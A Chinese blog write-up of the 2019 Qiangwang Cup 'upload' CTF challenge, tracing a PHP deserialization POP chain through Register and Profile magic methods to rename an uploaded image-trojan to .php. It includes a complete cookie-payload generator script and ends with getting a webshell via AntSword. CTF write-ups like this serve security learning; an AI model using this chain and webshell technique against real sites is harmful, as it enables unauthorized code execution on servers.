@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Hind:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="强网杯2019 upload 复现WP 分析整体review一遍，注册登录走一遍，另外发现可以上传文件，直接提交php后缀会提示forbidden，传图片木马，抓包修改上传也无法利用。 发现cookie是一串base64的加密字符串，解密后是一串序列化字符串.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯2019-upload">
+<meta property="og:url" content="http://example.com/2020/01/23/%E5%BC%BA%E7%BD%91%E6%9D%AF2019%20upload%20%E5%A4%8D%E7%8E%B0WP/index.html">
+<meta property="og:site_name" content="fxxy">
+<meta property="og:description" content="强网杯2019 upload 复现WP 分析整体review一遍，注册登录走一遍，另外发现可以上传文件，直接提交php后缀会提示forbidden，传图片木马，抓包修改上传也无法利用。 发现cookie是一串base64的加密字符串，解密后是一串序列化字符串.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619153141870.png">
+<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619153316777.png">
+<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619160639987.png">
+<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619162026455.png">
+<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619161957182.png">
+<meta property="article:published_time" content="2020-01-22T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-22T08:34:46.489Z">
+<meta property="article:author" content="fxxy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619153141870.png">
+
+<link rel="canonical" href="http://example.com/2020/01/23/%E5%BC%BA%E7%BD%91%E6%9D%AF2019%20upload%20%E5%A4%8D%E7%8E%B0WP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>强网杯2019-upload | fxxy</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="fxxy" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">fxxy</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">19</span></a>
+
+  </li>
+        <li class="menu-item menu-item-友链">
+
+    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/01/23/%E5%BC%BA%E7%BD%91%E6%9D%AF2019%20upload%20%E5%A4%8D%E7%8E%B0WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/logo.png">
+      <meta itemprop="name" content="fxxy">
+      <meta itemprop="description" content="力争下游。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fxxy">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          强网杯2019-upload
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-01-23 00:00:00" itemprop="dateCreated datePublished" datetime="2020-01-23T00:00:00+08:00">2020-01-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-10-22 16:34:46" itemprop="dateModified" datetime="2021-10-22T16:34:46+08:00">2021-10-22</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>强网杯2019 upload 复现WP</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>整体review一遍，注册登录走一遍，另外发现可以上传文件，直接提交php后缀会提示forbidden，传图片木马，抓包修改上传也无法利用。</p>
+<p>发现cookie是一串base64的加密字符串，解密后是一串序列化字符串.</p>
+<span id="more"></span>
+
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619153141870.png" alt="image-20200619153141870"></p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619153316777.png" alt="image-20200619153316777"></p>
+<p>首先想到的是反序列化，但是反序列化一般都需要源码，所以试了<a target="_blank" rel="noopener" href="http://www.zip和www.tar.gz,下载了源码./">www.zip和www.tar.gz，下载了源码。</a></p>
+<p>全局搜索unserilize函数和serialize函数，发现分别在profile.php和index.php中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php   unserialize()  //对cookie进行反序列化操作 </span><br><span class="line">profile.php  serialize()</span><br></pre></td></tr></table></figure>
+
+<p>全局搜索魔法函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__desstruct()  Register.php -&gt; class Register</span><br><span class="line">__call()   profile.php -&gt; class profile</span><br><span class="line">__get()    profile.php -&gt; class profile</span><br></pre></td></tr></table></figure>
+
+<p>梳理一下这几个魔法函数在php反序列化中的作用</p>
+<ul>
+<li>__destruct()：调用unserialize()函数时会自动触发这个函数</li>
+<li>__call()：当被调用的方法不在此类中时，会触发这个函数</li>
+<li>__get()：当调用的属性不在此类中时，将触发这个方法</li>
+</ul>
+<p>分别列举出这几个函数看一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Register.php</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>会调用check中的index方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">profile.php    </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>结合题目场景，用文件上传一个木马，然后菜刀连接getshell获取flag，但是上传的图片木马会被改名，另外梳理一下源代码逻辑，找一下文件操作代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">profile.php</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>梳理一下这段代码的作用</p>
+<ul>
+<li><p>1.检查是否登录 。<strong>this-&gt;checker=0时则不进入此判断。</strong></p>
+</li>
+<li><p>2.检查流量包中是否存在$_FILE，存在则会进入ext_check()进行判断，看一下etc_check()的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ext_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span>=explode(<span class="string">&quot;.&quot;</span>,<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;ext=end(<span class="variable">$ext_arr</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext==<span class="string">&quot;png&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现这段代码就是判断文件是否为png文件，我们需要绕过这个判断，由文件上传的知识可以知道，当用GET方式上传文件时，$_FILE这个全局变量是为空的，所以<strong>这里可以用GET访问绕过</strong></p>
+</li>
+<li><p>如果ext为1，则进行相应的文件操作在后面的构造中，<strong>将ext设为1即可</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename); <span class="comment">//复制文件</span></span><br><span class="line">@unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>关键操作在第3点：用copy函数，将filename_tmp的值覆盖原来的文件名，这里就是我们最终想要操作的地方，由前面可知，我们上传的木马被改名且不可用，我们的突破点是<strong>将被改了名的文件改成我们希望的文件名</strong>。所以，终极目标是：<strong>触发profile中的img_upload()方法，且绕过进入文件操作前面的那些判断。</strong></p>
+<p>首先明确这个操作在profile类中</p>
+<ul>
+<li>第一，我们的序列号字符串中需要一个profile类来通过一些手段来触发这个函数。</li>
+<li>第二，如何才能触发这个类中的方法？关注_ <em>call()、 _ _get() 、</em> destruct()这三个函数</li>
+</ul>
+<p>首先看__destruct()函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Register.php</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>会调用checker中的index方法，那么我们怎么才能利用这个函数来呢？首先是解决如何触发profile中的魔术方法</p>
+<p>再看__call()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码意思为，当所调用的方法不存在时，会进行下面的操作，结合destruct中的代码，如果我们的checker当时序列化的是profile，在destruct的时候，会调用index()方法，但是这个方法在profile中是不存在的，所以触发call方法，到了call方法后，注意这里：$this-&gt;{$this-&gt;$name}()，此时，$name为之前传入的index，这里$this-&gt;$name变为了调用属性。当调用类中不存在的属性名时，会触发__get()方法，看看代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>会返回except[$name]的值，注意！我们的终极目标是触发img_upload()函数！这里就是突破点，如果我们把except赋值为：$except[index=&gt;’upload_img’]的话，那get函数返回的值为upload_img，在call函数中，就变成了 $this -&gt; upload_img()，就成功触发了upload_img函数。</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>下面我们来梳理一下payload。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> </span></span><br><span class="line"><span class="class"></span>&#123;	</span><br><span class="line">	<span class="comment">//绕过登录判断</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>=<span class="string">&quot;../public/upload/1.png&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;../public/upload/fxxy.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="comment">//绕过文件后缀名判断</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="comment">//触发upload_img()</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>=<span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Register();</span><br><span class="line"><span class="variable">$a</span>-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;checker = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// echo serialize($a);</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后用生成的payload替换我们的cookie</p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619160639987.png" alt="image-20200619160639987"></p>
+<p>可以看到文件名已经改了</p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619162026455.png" alt="image-20200619162026455"></p>
+<p>蚁🗡连接，getshell。</p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619161957182.png" alt="image-20200619161957182"></p>
+<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul>
+<li>对于POP链的构造加深了理解，找到反序列化点后，一般先全局搜索相关的魔法函数，看这些函数能否通过相关的手段串联起来达到我们最终的目的</li>
+<li>PHP的namespace理解。<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/php-namespace-intro.html">https://www.runoob.com/w3cnote/php-namespace-intro.html</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/10/30/docker%E7%AC%94%E8%AE%B0/" rel="prev" title="docker学习笔记">
+      <i class="fa fa-chevron-left"></i> docker学习笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/03/14/vue%E7%AC%94%E8%AE%B0/" rel="next" title="vue笔记">
+      vue笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload"><span class="nav-number">2.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7"><span class="nav-number">3.</span> <span class="nav-text">收获</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="fxxy"
+      src="/images/logo.png">
+  <p class="site-author-name" itemprop="name">fxxy</p>
+  <div class="site-description" itemprop="description">力争下游。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fxxy-xx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fxxy-xx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2420225660@qq.com" title="E-Mail → mailto:2420225660@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fxxy</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
